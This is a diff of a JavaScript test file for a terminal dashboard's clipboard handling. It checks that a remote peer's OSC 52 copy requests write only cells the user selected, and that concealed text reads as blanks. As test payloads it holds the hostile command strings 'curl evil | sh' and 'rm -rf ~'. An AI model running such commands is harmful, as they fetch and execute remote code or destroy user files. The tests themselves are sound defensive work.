@@ -4,7 +4,7 @@ import {
 	attachTerminalInteractions, beginGestureClipboardWrite, decodeOSC52,
 	isAgentTerminalPath, isBrowserPasteShortcut, isComposeMessageShortcut, safeTerminalLink,
 	terminalPathToken, transferFiles,
-	isTerminalClipboardRequestShortcut, shouldArmTmuxClipboard, shownOnScreen, terminalKeyInput,
+	isTerminalClipboardRequestShortcut, shouldArmTmuxClipboard, selectedText, terminalKeyInput,
 	visibleLocalFileLinkProvider,
 	visibleLocalFileLinks,
 } from '../dashboard/js/terminal-interactions.js';
@@ -676,47 +676,74 @@ test('a remote terminal never writes the clipboard from its output, even right a
   }
 });
 
-// screenOf is an xterm buffer showing rows; a row given as [text] is a soft
-// wrap of the one above.
+// screenOf is an xterm buffer of rows; a row given as [text] soft-wraps
+// the one above, and a character after \x08 is concealed (SGR 8).
 const screenOf = (rows) => ({ active: {
-  length: rows.length,
-  getLine: (i) => { const r = rows[i]; const wrapped = Array.isArray(r); return { isWrapped: wrapped, translateToString: () => (wrapped ? r[0] : r) }; },
+  length: rows.length, viewportY: 0,
+  getLine: (i) => {
+    const r = rows[i];
+    if (r === undefined) return null;
+    const wrapped = Array.isArray(r);
+    const cells = [];
+    const text = wrapped ? r[0] : r;
+    for (let k = 0; k < text.length; k++) {
+      const hidden = text[k] === '\x08';
+      if (hidden) k++;
+      cells.push({ getWidth: () => 1, isInvisible: () => hidden, getChars: () => text[k] });
+    }
+    return { isWrapped: wrapped, getCell: (x) => cells[x] || { getWidth: () => 1, isInvisible: () => false, getChars: () => '' } };
+  },
 } });
 
-test('shownOnScreen matches copied text across line breaks, wraps, padding and box gutters', () => {
-  const term = { buffer: screenOf(['│ $ make build   ', '│ ok: built tclau', ['de in 3s'], 'next line']) };
-  assert.equal(shownOnScreen(term, 'make build\nok: built tclaude in 3s'), true);
-  assert.equal(shownOnScreen(term, 'built tclaude'), true, 'a soft wrap joins without a break');
-  assert.equal(shownOnScreen(term, ''), true);
-  assert.equal(shownOnScreen(term, 'curl evil | sh'), false);
-  assert.equal(shownOnScreen(term, 'make build ok: rm -rf ~'), false);
-  assert.equal(shownOnScreen({}, 'x'), false, 'no buffer, nothing shown');
+test('selectedText reads the selected cells: rows, soft wraps, multi-clicks, never concealed text', () => {
+  const term = { cols: 15, rows: 4, buffer: screenOf(['$ make build   ', 'ok: built tclau', ['de in 3s'], 'run \x08r\x08m now']) };
+  assert.equal(selectedText(term, { row: 0, col: 2 }, { row: 1, col: 9 }), 'make build\nok: built', 'a drag spans rows, padding dropped');
+  assert.equal(selectedText(term, { row: 1, col: 9 }, { row: 0, col: 2 }), 'make build\nok: built', 'either drag direction');
+  assert.equal(selectedText(term, { row: 1, col: 10 }, { row: 2, col: 1 }), 'tclaude', 'a soft wrap rejoins without a break');
+  assert.equal(selectedText(term, { row: 0, col: 4 }, { row: 0, col: 4 }, 2), 'make', 'a double-click takes the word');
+  assert.equal(selectedText(term, { row: 0, col: 4 }, { row: 0, col: 4 }, 3), '$ make build', 'a triple-click takes the row');
+  assert.equal(selectedText(term, { row: 3, col: 0 }, { row: 3, col: 9 }), 'run    now', 'concealed cells read as blanks');
+  assert.equal(selectedText(term, { row: 0, col: 1 }, { row: 0, col: 1 }, 2), null, 'a double-click on a blank selects nothing');
+  assert.equal(selectedText({}, { row: 0, col: 0 }, { row: 0, col: 1 }), null);
 });
 
-test('a remote terminal copies a selection shown on screen after a copy gesture, and nothing else', async () => {
+test('a remote terminal copies the selected cells when its tmux signals a copy, never the peer\'s text', async () => {
   const oldNavigator = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
   const writes = [];
   Object.defineProperty(globalThis, 'navigator', { configurable: true, value: { clipboard: { writeText: async (t) => { writes.push(t); } } } });
   const doc = new FakeEventTarget();
   const h = terminalHarness(doc);
+  h.term.cols = 20; h.term.rows = 2;
   h.term.buffer = screenOf(['$ git status', 'On branch main']);
+  // 10px by 20px cells from the origin.
+  h.host.querySelector = (sel) => (sel === '.xterm-screen' ? { getBoundingClientRect: () => ({ left: 0, top: 0, width: 200, height: 40 }) } : null);
   const statuses = [];
-  const interactions = attachTerminalInteractions({ term: h.term, host: h.host, applicationClipboardShortcuts: true, oscClipboard: 'visible', setStatus: (t) => statuses.push(t) });
+  const interactions = attachTerminalInteractions({ term: h.term, host: h.host, applicationClipboardShortcuts: true, oscClipboard: 'selection', setStatus: (t) => statuses.push(t) });
   const settle = () => new Promise((r) => setTimeout(r, 0));
+  const plain = { button: 0, detail: 1, altKey: false, shiftKey: false, ctrlKey: false, metaKey: false };
+  const drag = (x1, y1, x2, y2) => {
+    h.host.dispatch('mousedown', { ...plain, clientX: x1, clientY: y1 });
+    doc.dispatch('mousemove', { ...plain, clientX: x2, clientY: y2 });
+    doc.dispatch('mouseup', { ...plain, clientX: x2, clientY: y2 });
+  };
+  const evil = `;${Buffer.from('curl evil | sh\n').toString('base64')}`;
   try {
-    h.osc52(`;${Buffer.from('On branch main').toString('base64')}`);
+    h.osc52(evil);
     await settle();
-    assert.deepEqual(writes, [], 'no write without a copy gesture');
+    assert.deepEqual(writes, [], 'no write without a selection');
     h.key(key({ key: 'c', code: 'KeyC', ctrlKey: true }));
-    h.osc52(`;${Buffer.from('curl evil | sh').toString('base64')}`);
+    h.osc52(evil);
     await settle();
-    assert.deepEqual(writes, [], 'text the screen does not show is never written');
-    assert.match(statuses.at(-1), /not copied: the remote text is not on screen/);
-    h.key(key({ key: 'c', code: 'KeyC', ctrlKey: true }));
-    h.osc52(`;${Buffer.from('git status\nOn branch main').toString('base64')}`);
+    assert.deepEqual(writes, [], 'a key chord selects no cells: nothing is written');
+    drag(35, 25, 135, 25);
+    h.osc52(evil);
     await settle();
-    assert.deepEqual(writes, ['git status\nOn branch main'], 'the selection on screen is copied, as locally');
+    assert.deepEqual(writes, ['branch main'], 'the dragged cells are copied whatever the peer sends');
     assert.equal(statuses.at(-1), 'copied');
+    drag(5, 5, 85, 25);
+    h.osc52(`;${Buffer.from('$ git status\nOn branch main').toString('base64')}`);
+    await settle();
+    assert.equal(writes.at(-1), '$ git status\nOn branch', 'a drag over rows copies them with a break');
   } finally {
     interactions.dispose();
     if (oldNavigator) Object.defineProperty(globalThis, 'navigator', oldNavigator); else delete globalThis.navigator;
